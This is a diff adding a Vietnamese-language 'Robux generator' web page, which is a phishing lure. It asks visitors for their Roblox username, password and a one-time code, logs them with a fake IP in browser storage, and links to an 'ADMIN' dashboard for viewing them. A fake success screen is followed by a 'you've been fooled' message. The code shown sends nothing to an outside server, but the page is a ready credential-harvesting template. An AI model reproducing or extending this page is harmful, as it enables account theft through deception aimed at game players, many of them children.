@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 ROBUX GENERATOR 2024</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Card chính */
+        .card {
+            background: white;
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 40px 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 36px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+
+        .header h1 i {
+            margin: 0 10px;
+            color: gold;
+        }
+
+        .robux-badge {
+            background: rgba(255,255,255,0.2);
+            border-radius: 50px;
+            padding: 12px 30px;
+            display: inline-block;
+            border: 2px solid rgba(255,255,255,0.5);
+        }
+
+        .robux-badge span {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .robux-badge i {
+            color: gold;
+            margin-right: 10px;
+        }
+
+        /* Body */
+        .body {
+            padding: 40px 30px;
+        }
+
+        /* Input group */
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+
+        .input-group label i {
+            margin-right: 8px;
+            color: #667eea;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #667eea;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+        }
+
+        .toggle-password:hover {
+            color: #667eea;
+        }
+
+        /* Slider */
+        .slider-container {
+            background: #f5f5f5;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .slider-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .slider-label span:last-child {
+            color: #667eea;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        input[type=range] {
+            width: 100%;
+            height: 6px;
+            border-radius: 3px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #667eea;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        input[type=range]::-webkit-slider-thumb:hover {
+            transform: scale(1.2);
+        }
+
+        /* Button */
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+        }
+
+        .btn i {
+            margin-right: 10px;
+        }
+
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* OTP */
+        .otp-container {
+            text-align: center;
+        }
+
+        .otp-title {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .otp-box {
+            width: 60px;
+            height: 70px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 32px;
+            font-weight: 700;
+            text-align: center;
+            color: #333;
+            transition: all 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: #667eea;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+
+        /* Success & Troll */
+        .message-box {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #4caf50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 40px;
+        }
+
+        .troll-icon {
+            width: 80px;
+            height: 80px;
+            background: #f44336;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 40px;
+        }
+
+        .message-box h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .message-box p {
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        /* Dashboard button */
+        .dash-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.5);
+            color: #00ff00;
+            padding: 12px 24px;
+            border-radius: 30px;
+            text-decoration: none;
+            border: 2px solid #00ff00;
+            transition: all 0.2s;
+            z-index: 100;
+        }
+
+        .dash-btn:hover {
+            background: #00ff00;
+            color: black;
+        }
+
+        .dash-btn i {
+            margin-right: 8px;
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #4caf50;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            display: none;
+            z-index: 1000;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+
+        .notification.error {
+            background: #f44336;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .header h1 { font-size: 28px; }
+            .otp-box { width: 50px; height: 60px; font-size: 24px; }
+            .dash-btn { padding: 8px 16px; font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Dashboard Button -->
+    <a href="dashboard.html" class="dash-btn">
+        <i class="fas fa-crown"></i> ADMIN
+    </a>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <span id="notifText"></span>
+    </div>
+
+    <!-- Main Card -->
+    <div class="card">
+        <div class="header">
+            <h1>
+                <i class="fas fa-crown"></i>
+                ROBUX
+                <i class="fas fa-crown"></i>
+            </h1>
+            <div class="robux-badge">
+                <i class="fas fa-coins"></i>
+                <span id="headerRobux">10,000</span>
+            </div>
+        </div>
+
+        <div class="body" id="mainContent">
+            <!-- Form -->
+            <div id="formSection">
+                <div class="input-group">
+                    <label><i class="fas fa-user"></i> USERNAME</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user-circle"></i>
+                        <input type="text" id="username" placeholder="Nhập username...">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label><i class="fas fa-lock"></i> PASSWORD</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-key"></i>
+                        <input type="password" id="password" placeholder="Nhập password...">
+                        <i class="fas fa-eye toggle-password" onclick="togglePassword()"></i>
+                    </div>
+                </div>
+
+                <div class="slider-container">
+                    <div class="slider-label">
+                        <span><i class="fas fa-coins"></i> SỐ ROBUX:</span>
+                        <span id="robuxDisplay">10,000</span>
+                    </div>
+                    <input type="range" id="robuxSlider" min="1000" max="100000" value="10000" step="1000" oninput="updateRobux()">
+                </div>
+
+                <button class="btn" onclick="startProcess()">
+                    <i class="fas fa-magic"></i> NHẬN ROBUX
+                </button>
+            </div>
+
+            <!-- Loading -->
+            <div id="loadingSection" style="display: none;" class="loading">
+                <div class="spinner"></div>
+                <p style="color: #666;">Đang xử lý...</p>
+            </div>
+
+            <!-- OTP -->
+            <div id="otpSection" style="display: none;" class="otp-container">
+                <div class="otp-title">
+                    <i class="fas fa-shield-alt" style="color: #667eea;"></i>
+                    XÁC MINH OTP
+                </div>
+                <div class="otp-inputs">
+                    <input type="text" class="otp-box" maxlength="1" onkeyup="moveToNext(this, 0)" onkeypress="return onlyNumber(event)">
+                    <input type="text" class="otp-box" maxlength="1" onkeyup="moveToNext(this, 1)" onkeypress="return onlyNumber(event)">
+                    <input type="text" class="otp-box" maxlength="1" onkeyup="moveToNext(this, 2)" onkeypress="return onlyNumber(event)">
+                    <input type="text" class="otp-box" maxlength="1" onkeyup="moveToNext(this, 3)" onkeypress="return onlyNumber(event)">
+                </div>
+                <button class="btn" onclick="verifyOTP()">
+                    <i class="fas fa-check"></i> XÁC NHẬN
+                </button>
+            </div>
+
+            <!-- Success -->
+            <div id="successSection" style="display: none;" class="message-box">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h2>THÀNH CÔNG!</h2>
+                <p>Đang gửi robux về tài khoản...</p>
+                <div class="spinner" style="width: 40px; height: 40px;"></div>
+            </div>
+
+            <!-- Troll -->
+            <div id="trollSection" style="display: none;" class="message-box">
+                <div class="troll-icon">
+                    <i class="fas fa-skull"></i>
+                </div>
+                <h2>BỊ LỪA RỒI! 😈</h2>
+                <p>Không có robux free đâu nha!</p>
+                <button class="btn" onclick="resetPage()">
+                    <i class="fas fa-redo"></i> THỬ LẠI
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentData = {};
+
+        // Update robux
+        function updateRobux() {
+            const val = document.getElementById('robuxSlider').value;
+            document.getElementById('robuxDisplay').textContent = Number(val).toLocaleString();
+            document.getElementById('headerRobux').textContent = Number(val).toLocaleString();
+        }
+
+        // Toggle password
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const icon = document.querySelector('.toggle-password');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                pwd.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        // Only number
+        function onlyNumber(e) {
+            return (e.charCode >= 48 && e.charCode <= 57);
+        }
+
+        // Move to next OTP
+        function moveToNext(current, index) {
+            if (current.value.length === 1) {
+                const inputs = document.querySelectorAll('.otp-box');
+                if (index < 3) inputs[index + 1].focus();
+            }
+        }
+
+        // Show notification
+        function showNotification(msg, isError = false) {
+            const notif = document.getElementById('notification');
+            const text = document.getElementById('notifText');
+            text.textContent = msg;
+            notif.className = 'notification' + (isError ? ' error' : '');
+            notif.style.display = 'flex';
+            setTimeout(() => {
+                notif.style.display = 'none';
+            }, 2000);
+        }
+
+        // Start process
+        function startProcess() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const robux = document.getElementById('robuxSlider').value;
+
+            if (!username || !password) {
+                showNotification('Nhập đầy đủ thông tin!', true);
+                return;
+            }
+
+            currentData = { username, password, robux };
+
+            document.getElementById('formSection').style.display = 'none';
+            document.getElementById('loadingSection').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('otpSection').style.display = 'block';
+            }, 2000);
+        }
+
+        // Verify OTP
+        function verifyOTP() {
+            const inputs = document.querySelectorAll('.otp-box');
+            let otp = '';
+            inputs.forEach(i => otp += i.value);
+
+            if (otp.length === 4) {
+                // Save to localStorage
+                let logs = JSON.parse(localStorage.getItem('robuxLogs')) || [];
+                logs.unshift({
+                    ...currentData,
+                    otp: otp,
+                    time: new Date().toLocaleString(),
+                    ip: '192.168.1.' + Math.floor(Math.random() * 255)
+                });
+                localStorage.setItem('robuxLogs', JSON.stringify(logs));
+
+                document.getElementById('otpSection').style.display = 'none';
+                document.getElementById('successSection').style.display = 'block';
+
+                setTimeout(() => {
+                    document.getElementById('successSection').style.display = 'none';
+                    document.getElementById('trollSection').style.display = 'block';
+                }, 2000);
+            } else {
+                showNotification('Nhập đủ 4 số OTP!', true);
+            }
+        }
+
+        // Reset page
+        function resetPage() {
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('robuxSlider').value = '10000';
+            updateRobux();
+            
+            document.getElementById('trollSection').style.display = 'none';
+            document.getElementById('formSection').style.display = 'block';
+            
+            document.querySelectorAll('.otp-box').forEach(i => i.value = '');
+        }
+    </script>
+</body>
+</html>
